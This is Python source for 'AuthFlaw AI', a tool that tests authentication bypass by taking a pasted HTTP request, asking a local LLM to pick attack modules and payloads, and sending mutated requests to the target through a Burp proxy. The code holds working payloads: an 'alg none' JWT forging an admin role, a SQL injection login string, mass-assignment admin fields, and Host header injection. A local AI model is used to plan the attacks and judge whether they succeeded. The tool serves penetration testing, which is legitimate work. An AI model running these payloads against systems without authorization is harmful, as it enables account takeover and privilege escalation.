#!/usr/bin/env python3
"""
AuthFlaw AI - Authentication Logic Bypass Tool
Python + MCP + Local AI (Ollama)
Version: 1.0.0
"""

VERSION = "1.0.0"

BANNER = r"""
   _____     ____ ___  ___________   ___ ___           ___________ .____         _____    __      __  
  /  _  \   |    |   \ \__    ___/  /   |   \          \_   _____/ |    |       /  |  |  /  \    /  \ 
 /  /_\  \  |    |   /   |    |    /    ~    \          |    __)   |    |      /   |  |_ \   \/\/   / 
/    |    \ |    |  /    |    |    \    Y    /          |     \    |    |___  /    ^   /  \        /  
\____|__  / |______/     |____|     \___|_  /   ______  \___  /    |_______ \ \____   |    \__/\  /   
        \/                                \/   /_____/      \/             \/      |__|         \/    
                                                                                                      
                                                                      _____    .___                   
  ______   ____   _____      ____     ____     ____   _______        /  _  \   |   |                  
 /  ___/ _/ ___\  \__  \    /    \   /    \  _/ __ \  \_  __ \      /  /_\  \  |   |                  
 \___ \  \  \___   / __ \_ |   |  \ |   |  \ \  ___/   |  | \/     /    |    \ |   |                  
/____  >  \___  > (____  / |___|  / |___|  /  \___  >  |__|        \____|__  / |___|                  
     \/       \/       \/       \/       \/       \/                       \/                         
                                                                                                      
"""

import re
import json
import requests
import ollama
from urllib.parse import urlparse, parse_qs
from colorama import init, Fore, Style
from typing import Dict, List, Optional
import warnings

warnings.filterwarnings('ignore', message='Unverified HTTPS request')
init(autoreset=True)

class AuthFlawAI:
    def __init__(self, burp_host="127.0.0.1", burp_port=8080):
        self.burp_proxy = {
            "http": f"http://{burp_host}:{burp_port}",
            "https": f"http://{burp_host}:{burp_port}"
        }
        self.session = requests.Session()
        self.session.proxies = self.burp_proxy
        self.session.verify = False  # Burp CA cert
        self.findings = []
        
        # Initialize local AI
        try:
            self.ai = ollama.Client()
        except:
            self.ai = None
            print(f"{Fore.YELLOW}Warning: Ollama not available, using fallback analysis")
        
    def parse_raw_request(self, raw_request: str) -> Dict:
        """Parse raw HTTP request into structured format"""
        lines = raw_request.strip().split('\n')
        
        # Parse request line
        request_line = lines[0].split(' ')
        method = request_line[0]
        path = request_line[1]
        
        # Parse headers
        headers = {}
        body_start = 0
        for i, line in enumerate(lines[1:], 1):
            if line.strip() == '':
                body_start = i + 1
                break
            if ': ' in line:
                key, value = line.split(': ', 1)
                headers[key] = value
        
        # Parse body
        body = '\n'.join(lines[body_start:]) if body_start < len(lines) else ''
        
        # Parse URL parameters
        url_parse = urlparse(path)
        params = parse_qs(url_parse.query)
        
        # Detect auth mechanism
        auth_type = self._detect_auth(headers, body)
        
        return {
            "method": method,
            "path": url_parse.path,
            "params": params,
            "headers": headers,
            "body": body,
            "auth_type": auth_type,
            "raw": raw_request
        }
    
    def _detect_auth(self, headers: Dict, body: str) -> str:
        """Detect authentication mechanism"""
        # Check for JWT
        auth_header = headers.get('Authorization', '')
        if 'Bearer' in auth_header:
            return "JWT"
        if 'Basic' in auth_header:
            return "Basic"
        
        # Check for session cookies
        cookie = headers.get('Cookie', '')
        if 'session' in cookie.lower() or 'token' in cookie.lower():
            return "Session"
        
        # Check body for credentials
        if '"email"' in body and '"password"' in body:
            return "JSON_Login"
        if 'email=' in body or 'username=' in body:
            return "Form_Login"
        
        return "Unknown"
    
    def ai_analyze_request(self, request: Dict) -> Dict:
        """Use local AI to analyze request and suggest attack modules"""
        
        prompt = f"""
Analyze this HTTP request and identify authentication vulnerabilities.

METHOD: {request['method']}
PATH: {request['path']}
AUTH_TYPE: {request['auth_type']}

HEADERS:
{json.dumps(request['headers'], indent=2)}

BODY:
{request['body'][:500]}

Based on this request, answer:
1. What authentication mechanism is being used?
2. What potential authentication bypass vulnerabilities exist?
3. Which attack modules should I run? (pick from: MassAssignment, SQLi, HostHeader, JWT_None, JWT_Confusion, RateLimit, SessionFixation, RegistrationPrivEsc)
4. Generate 3 specific attack payloads to try FIRST.

Return ONLY valid JSON:
{{
    "auth_mechanism": "string",
    "potential_vulns": ["vuln1", "vuln2"],
    "modules_to_run": ["module1", "module2"],
    "payloads": ["payload1", "payload2", "payload3"]
}}
"""
        
        if self.ai:
            try:
                response = self.ai.generate(model="llama3.2", prompt=prompt)
                result = json.loads(response['response'])
                return result
            except Exception as e:
                print(f"{Fore.YELLOW}AI Analysis failed: {e}, using fallback")
        
        return self._fallback_analysis(request)
    
    def _fallback_analysis(self, request: Dict) -> Dict:
        """Fallback if AI is not available"""
        modules = []
        payloads = []
        
        if request['auth_type'] == "JWT":
            modules = ["JWT_None", "JWT_Confusion"]
            payloads = [
                '{"alg":"none"}.eyJyb2xlIjoiYWRtaW4ifQ.',
                'HS256 signed with RS256 public key'
            ]
        elif 'email' in request['body']:
            modules = ["SQLi", "MassAssignment", "RegistrationPrivEsc"]
            payloads = [
                '"email":"admin\' OR \'1\'=\'1\' --"',
                '"role":"admin"',
                '"is_admin":true'
            ]
        
        return {
            "auth_mechanism": request['auth_type'],
            "potential_vulns": modules,
            "modules_to_run": modules,
            "payloads": payloads
        }
    
    def generate_attack_variants(self, original: Dict, ai_decision: Dict) -> List[Dict]:
        """Generate mutated requests based on AI decision"""
        variants = []
        
        for module in ai_decision.get('modules_to_run', []):
            for payload in ai_decision.get('payloads', []):
                variant = original.copy()
                variant['headers'] = original['headers'].copy()
                
                if module == "SQLi":
                    # Inject SQLi into email field
                    if 'email' in variant['body']:
                        variant['body'] = re.sub(
                            r'"email"\s*:\s*"[^"]*"',
                            f'{payload}',
                            variant['body']
                        )
                
                elif module == "MassAssignment":
                    # Add role parameter
                    if variant['body'].strip().endswith('}'):
                        variant['body'] = variant['body'].rstrip().rstrip('}') + f',{payload}' + '}'
                
                elif module == "RegistrationPrivEsc":
                    # Add admin flag
                    if variant['body'].strip().endswith('}'):
                        variant['body'] = variant['body'].rstrip().rstrip('}') + f',{payload}' + '}'
                
                elif module == "HostHeader":
                    # Inject malicious host
                    variant['headers']['Host'] = payload
                    variant['headers']['X-Forwarded-Host'] = payload
                
                variants.append({
                    "module": module,
                    "payload": payload,
                    "request": variant
                })
        
        return variants
    
    def send_to_burp_repeater(self, variant: Dict) -> Optional[Dict]:
        """Send request through Burp proxy (appears in HTTP History)"""
        try:
            host = variant['request']['headers'].get('Host', 'target.com')
            url = f"https://{host}{variant['request']['path']}"
            
            response = self.session.request(
                method=variant['request']['method'],
                url=url,
                headers=variant['request']['headers'],
                data=variant['request']['body'] if variant['request']['method'] == 'POST' else None,
                params=variant['request'].get('params', {}),
                timeout=10
            )
            
            return {
                "status": response.status_code,
                "headers": dict(response.headers),
                "body": response.text[:1000],  # First 1000 chars
                "length": len(response.text)
            }
        except Exception as e:
            print(f"{Fore.RED}    Request failed: {e}")
            return None
    
    def ai_analyze_response(self, request: Dict, response: Dict, original: Dict) -> Dict:
        """AI analyzes response to determine if vulnerability exists"""
        
        prompt = f"""
I sent this attack payload:

MODULE: {request.get('module')}
PAYLOAD: {request.get('payload')}

And received this response:

STATUS: {response.get('status')}
HEADERS: {json.dumps(response.get('headers', {}), indent=2)}
BODY: {response.get('body', '')[:500]}

Original normal response would be different.

Answer:
1. Is this a successful authentication bypass? (yes/no/partial)
2. What vulnerability does this indicate?
3. Should I try a different variation?
4. What's the CVSS score estimate?

Return JSON:
{{
    "success": "yes/no/partial",
    "vulnerability": "string or null",
    "next_action": "try_variation/report_finding/stop",
    "cvss_estimate": 0.0
}}
"""
        
        if self.ai:
            try:
                response_ai = self.ai.generate(model="llama3.2", prompt=prompt)
                return json.loads(response_ai['response'])
            except:
                pass
        
        # Simple heuristic if AI fails
        if response.get('status') in [200, 302]:
            return {"success": "yes", "vulnerability": "Possible bypass", "next_action": "report_finding", "cvss_estimate": 7.5}
        else:
            return {"success": "no", "vulnerability": None, "next_action": "stop", "cvss_estimate": 0.0}
    
    def run(self, raw_request: str):
        """Main execution flow"""
        print(f"{Fore.CYAN}{BANNER}")
        print(f"{Fore.GREEN}Authentication Bypass Testing Tool v{VERSION}")
        print(f"{Fore.CYAN}{'='*120}\n")
        
        # PHASE 1: Parse request
        print(f"{Fore.YELLOW}[1/5] Parsing request...")
        parsed = self.parse_raw_request(raw_request)
        print(f"  → Method: {parsed['method']}")
        print(f"  → Path: {parsed['path']}")
        print(f"  → Auth Type: {parsed['auth_type']}")
        
        # PHASE 2: AI Analysis
        print(f"\n{Fore.YELLOW}[2/5] AI analyzing request...")
        ai_decision = self.ai_analyze_request(parsed)
        print(f"  → Auth mechanism: {ai_decision.get('auth_mechanism')}")
        print(f"  → Potential vulns: {', '.join(ai_decision.get('potential_vulns', []))}")
        print(f"  → Modules to run: {', '.join(ai_decision.get('modules_to_run', []))}")
        
        # PHASE 3: Generate variants
        print(f"\n{Fore.YELLOW}[3/5] Generating attack variants...")
        variants = self.generate_attack_variants(parsed, ai_decision)
        print(f"  → Generated {len(variants)} attack variants")
        
        # PHASE 4: Send and analyze
        print(f"\n{Fore.YELLOW}[4/5] Testing via Burp proxy...")
        for i, variant in enumerate(variants, 1):
            print(f"\n  [{i}/{len(variants)}] Testing: {variant['module']}")
            print(f"    Payload: {variant['payload'][:50]}...")
            
            response = self.send_to_burp_repeater(variant)
            if response:
                print(f"    Response: HTTP {response['status']}")
                
                analysis = self.ai_analyze_response(variant, response, parsed)
                
                if analysis.get('success') == 'yes':
                    print(f"    {Fore.RED}[!] VULNERABLE! {analysis.get('vulnerability')}")
                    self.findings.append({
                        "module": variant['module'],
                        "payload": variant['payload'],
                        "response_status": response['status'],
                        "vulnerability": analysis.get('vulnerability'),
                        "cvss": analysis.get('cvss_estimate')
                    })
                elif analysis.get('success') == 'partial':
                    print(f"    {Fore.YELLOW}[*] PARTIAL - Need adjustment")
                else:
                    print(f"    {Fore.GREEN}[+] Not vulnerable")
        
        # PHASE 5: Report
        print(f"\n{Fore.YELLOW}[5/5] Generating report...")
        self.generate_report()
    
    def generate_report(self):
        """Print final report"""
        print(f"\n{Fore.CYAN}{'='*120}")
        print(f"{Fore.GREEN}FINDINGS REPORT")
        print(f"{Fore.CYAN}{'='*120}\n")
        
        if not self.findings:
            print(f"{Fore.GREEN}[+] No vulnerabilities found with tested payloads.")
            print(f"{Fore.YELLOW}[*] Review manually or run advanced modules.")
        else:
            print(f"{Fore.RED}[!] Found {len(self.findings)} potential vulnerabilities:\n")
            for i, finding in enumerate(self.findings, 1):
                print(f"  {i}. {finding['module']}")
                print(f"     CVSS: {finding['cvss']}")
                print(f"     Status: HTTP {finding['response_status']}")
                print(f"     Payload: {finding['payload'][:80]}...")
                print(f"     Vulnerability: {finding['vulnerability']}\n")
        
        print(f"{Fore.CYAN}[*] All requests sent through Burp proxy - Check HTTP History")
        print(f"{Fore.CYAN}[*] Use Repeater to manually investigate findings\n")
        
        # Save to JSON
        with open('reports/findings.json', 'w') as f:
            json.dump(self.findings, f, indent=2)
        print(f"{Fore.GREEN}[+] Report saved to reports/findings.json")

def main():
    print(f"{Fore.CYAN}Paste your HTTP request (press Enter twice when done):")
    lines = []
    while True:
        try:
            line = input()
            if not line and lines:
                break
            lines.append(line)
        except EOFError:
            break
    
    raw_request = '\n'.join(lines)
    
    if not raw_request:
        print(f"{Fore.RED}No request provided!")
        return
    
    tool = AuthFlawAI()
    tool.run(raw_request)

if __name__ == "__main__":
    main()
